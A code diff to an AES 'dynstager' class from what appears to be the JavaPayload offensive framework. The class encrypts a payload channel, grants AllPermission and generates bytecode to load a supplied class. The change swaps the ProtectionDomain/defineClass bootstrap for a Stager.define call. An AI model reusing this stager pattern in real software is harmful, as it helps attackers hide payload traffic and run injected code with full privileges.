@@ -38,14 +38,10 @@ import java.io.DataInputStream;
 import java.io.InputStream;
 import java.io.OutputStream;
 import java.io.PrintStream;
-import java.net.URL;
 import java.security.AllPermission;
-import java.security.CodeSource;
 import java.security.MessageDigest;
 import java.security.Permissions;
-import java.security.ProtectionDomain;
 import java.security.SecureRandom;
-import java.security.cert.Certificate;
 
 import javapayload.handler.dynstager.SynchronizedOutputStream;
 
@@ -93,9 +89,8 @@ public class AES extends WrappingDynStagerBuilder {
 			ci.init(Cipher.DECRYPT_MODE, new SecretKeySpec(keyBytes, "AES"), new IvParameterSpec(inIV), sr);
 			final Permissions permissions = new Permissions();
 			permissions.add(new AllPermission());
-			final ProtectionDomain pd = new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), permissions);
 			Class synchronizedOutputStreamClass;
-			synchronizedOutputStreamClass = bootstrap(pd);
+			synchronizedOutputStreamClass = bootstrap();
 			OutputStream so = (OutputStream) synchronizedOutputStreamClass.getConstructor(new Class[] { Class.forName("java.io.OutputStream") }).newInstance(new Object[] { new CipherOutputStream(out, co) });
 			bootstrapOrig(new CipherInputStream(din, ci), so, newParameters);
 		} catch (final Throwable t) {
@@ -119,35 +114,20 @@ public class AES extends WrappingDynStagerBuilder {
 		String classString = new String(cw2.toByteArray());
 		
 		// create the bootstrap method
-		MethodVisitor mv = cw.visitMethod(Opcodes.ACC_PRIVATE, bootstrapName, "(Ljava/security/ProtectionDomain;)Ljava/lang/Class;", null, new String[] { "java/lang/Exception" });
+		MethodVisitor mv = cw.visitMethod(Opcodes.ACC_PRIVATE, bootstrapName, "()Ljava/lang/Class;", null, new String[] { "java/lang/Exception" });
 		mv.visitCode();
+		mv.visitVarInsn(Opcodes.ALOAD, 0);
 		mv.visitLdcInsn(classString);
 		mv.visitLdcInsn("ISO-8859-1");
 		mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/String", "getBytes", "(Ljava/lang/String;)[B");
-		mv.visitVarInsn(Opcodes.ASTORE, 2);
-		mv.visitVarInsn(Opcodes.ALOAD, 0);
-		mv.visitInsn(Opcodes.ACONST_NULL);
-		mv.visitVarInsn(Opcodes.ALOAD, 2);
-		mv.visitInsn(Opcodes.ICONST_0);
-		mv.visitVarInsn(Opcodes.ALOAD, 2);
-		mv.visitInsn(Opcodes.ARRAYLENGTH);
-		mv.visitVarInsn(Opcodes.ALOAD, 1);
-		mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/ClassLoader", "defineClass", "(Ljava/lang/String;[BIILjava/security/ProtectionDomain;)Ljava/lang/Class;");
-		mv.visitVarInsn(Opcodes.ASTORE, 3);
-		mv.visitVarInsn(Opcodes.ALOAD, 0);
-		mv.visitVarInsn(Opcodes.ALOAD, 3);
-		mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/ClassLoader", "resolveClass", "(Ljava/lang/Class;)V");
-		mv.visitVarInsn(Opcodes.ALOAD, 3);
+		mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "javapayload/stager/Stager", "define", "([B)Ljava/lang/Class;");
 		mv.visitInsn(Opcodes.ARETURN);
-		mv.visitMaxs(6, 4);
+		mv.visitMaxs(3, 1);
 		mv.visitEnd();
 	}
 	
-	private Class bootstrap(ProtectionDomain pd) throws Exception {
+	private Class bootstrap() throws Exception {
 		throw new IllegalStateException("This method is replaced in the final stager");
-		// byte[] classfile = "TO_BE_REPLACED".getBytes("ISO-8859-1");
-		// Class clazz = defineClass(null, classfile, 0, classfile.length, pd);
-		// resolveClass(clazz);
-		// return clazz;
+		// return define("TO_BE_REPLACED".getBytes("ISO-8859-1"));
 	}
 }
